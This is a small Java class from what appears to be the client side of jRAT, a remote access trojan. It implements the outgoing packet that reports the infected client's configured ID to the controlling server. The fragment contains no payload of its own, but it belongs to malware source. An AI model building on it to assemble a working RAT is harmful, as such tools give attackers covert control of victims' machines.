package jrat.client.packets.outgoing;

import jrat.common.io.StringWriter;
import jrat.client.Configuration;

import java.io.DataOutputStream;


public class Packet7InitServerID extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(Configuration.getID());
	}

	@Override
	public short getPacketId() {
		return (byte) 7;
	}
}